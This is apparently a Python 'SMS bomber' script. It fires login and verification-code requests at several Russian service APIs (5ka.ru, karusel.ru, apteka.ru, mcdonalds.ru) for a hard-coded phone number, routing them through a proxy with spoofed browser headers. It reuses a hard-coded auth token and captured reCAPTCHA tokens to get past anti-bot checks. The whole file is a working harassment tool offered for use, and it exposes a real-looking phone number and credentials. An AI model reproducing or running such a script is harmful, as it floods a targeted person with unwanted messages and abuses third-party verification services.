import requests
import time


# print("Введи номер телефона без кода страны")
# phone=input()
# print("Номер телефона " + phone)
phone = '9519322412'
ts = 1
ipPort = "212.33.246.122:8080"
proxy = {"https": "https://" + ipPort}
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
    "Content-Type": "application/json", }


def pyaterka():
    pPhone = "+7" + phone
    pyaterkaHeaders = headers
    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
                            "Origin": "https://5ka.ru"})
    p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                      proxies=proxy)
    print(p.status_code)
    print(p.json())


def karusel():
    karHeaders = headers
    karHeaders.update({"Host": "app.karusel.ru", "Origin": "https://karusel.ru"})
    karPhone = "7" + phone
    kar = requests.post("https://app.karusel.ru/api/v2/token/", headers=karHeaders, json={"phone": karPhone,
                                                                                          "recaptcha_token": "03AGdBq255xknZF1jMw1N-O4w36uvaeyqFAeYk2x2MhYiDnLs31jnWYboOi1evSLHIrL7JSzXYjesrWMhv5sxvt2hJfEM2N3AXeAKjD135PpocJiEmrYWConWAg2XRGzUZp_rX-FgIoq2Y7qCyBcIdx1CW4KLzh6X_Xk2NvV3-F7L2jynBvXJNmpRL7DBsZZ5xCxLs4JYSfZS4UmPhd0yE-wGIgUtHb4Dz74PSCk61LJg8_bfpB-uo8xoEdgiCg6MeiPPWBjtCqZC_nBF-2zY93Vd64PQd7gAc4aJTd2O7iqGnKEdTPDvUex0B0sI2oHUNJ0m1Ggr0z3C9OWEPtr7l7S3zrgbiH7PZHtWbiuM2Y_VVPxs4aCedXDOWPF1kZ_EuZWYAhCN0iIwGrgJkHPnKl22HfyU149kpK1dTlz_fL_4BeJozTwv0atHwRbjGxYb7youdKp8fJmKe"},
                        proxies=proxy)
    print(kar.status_code)
    print(kar.json())


def aptekaru():
    aptHeaders = headers
    aptHeaders.update({"Host": "api.apteka.ru", "Origin": "https://apteka.ru", "cityId": "5e57803249af4c0001d64407"})
    aptPhone = "+7" + phone
    apt = requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d644070", headers=aptHeaders,
                        json={"phone": aptPhone, "u": "1"}, proxies=proxy)
    print(apt.status_code, "aptekaru")
    print(apt.json())
#def bistrodengi():
    #bisHeaders=headers
    #bisHeaders.update({"Host":"bistrodengi.ru","Origin":"https://bistrodengi.ru","X-Requested-With":"XMLHttpRequest"})
    #bisPhone="+7"+phone
    #bis=requests.post("https://bistrodengi.ru/ajax/lead.php",headers=bisHeaders,json={"fio":none,"phone":bisPhone})
def mcdonalds():
    mcHeaders=headers
    mcHeaders.update({"host":"site-api.mcdonalds.ru", "Origin":"https://mcdonalds.ru"})
    mcPhone="+7"+phone
    mc=requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",headers=mcHeaders, proxies=proxy,json={"number":"+79991253348","g-recaptcha-response":"03AGdBq25BqgSB9HzJmA1xZeGyo6I6_JpvzbC-a-wnYbYMRrech6-mXmImNqM6VfrpVMyFUuz1yykN2mzDXbqoz7uWlI0Y1L3AFaodQrnIjTS81mwaxWsfsohNFEdoDdIIYLW8INnBfh4h-f5u0GJN7M57xiGk_LjQqYV5s0Gi_lNBR_VxYUHleAKBFbRKZyn45UzsLU2L4hR5qpkp2Ai1UDxWugIBI4wUPO-AKU3n-5H-OZs_krT7ddVJ7rLnAvotMo10Z1TDQh-XyhY3GCeIl-Mr9c5lIctgb7VjVzcwh_ZXyJGy3kQgZ2QhORfe3VWlvzBgALSH6Wzf_v3LUXoL7pIf8ZFReMdu0m1d_-l5T0rrgZ5tK6bbMcBqa78hZ14U23oxLUviGVyLvxlrsZWqp1w4vL0oioHkJPGH3Z6dN-C8XBNi5RUxM3IV4t1Xqvci9lGB9DkRCL0-"})
    print(mc.status_code,"McDonalds")
    print(mc.json())

mcdonalds()
time.sleep(ts)
pyaterka()
time.sleep(ts)
aptekaru()
time.sleep(ts)
karusel()
